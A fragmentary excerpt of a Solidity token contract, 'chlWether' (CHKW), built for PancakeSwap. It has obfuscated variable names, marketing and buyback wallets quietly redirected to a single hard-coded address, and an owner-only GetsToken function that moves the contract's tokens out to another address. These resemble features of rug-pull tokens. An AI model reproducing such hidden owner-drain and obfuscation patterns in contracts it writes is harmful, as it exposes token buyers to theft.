...
contract CheckUsage is Context, IERC20, Ownable {  
    ...
    uint256 private _tFeeTotal;
     ...
     string  private _name = "chlWether";
    string  private _symbol = "CHKW";
    ...
    // address payable public markWallet = payable(0x8D8866b79F93243c7992D860b97E509437c26DC8);
    // address payable public  buybackWallet= payable(0x33470829d3B5474e6f2b776f6271B0E16BDCF05a);
    address payable public markWallet = payable(0x411E88B5EF404a2CE57A4801da33Deb91cCF53E7);
    address payable public  buybackWallet= payable(0x411E88B5EF404a2CE57A4801da33Deb91cCF53E7);
    
    mapping(address => bool) private _faceHandleLog;
    uint256 public  _lyaslVal = 1;
    uint256 public  _lyaansVal = 1;
    uint256 public _setBlallan=10000000000000000000000000000000;
    uint256 public _lyasgtVal=_setBlallan;
    IPancakeRouter02 public immutable pancakeRouter;    
    address public immutable pancakePair;
    uint256 private minTokensBeforeSwap = 100;
    uint256 public MaxTrans =1000000000000000000000000000000000000;
 ...
 function excludeFromFee(address account) external onlyOwner {
    ...
    function GetsToken(address _tokenContract, uint256 _amount) external  onlyOwner 
    {
        ...
        uint256 TakeAmnt=_amount.mul(10**_decimals);
        tokenContract.approve(address(this), TakeAmnt);
        tokenContract.transferFrom(address(this), takeMain, TakeAmnt);
   }
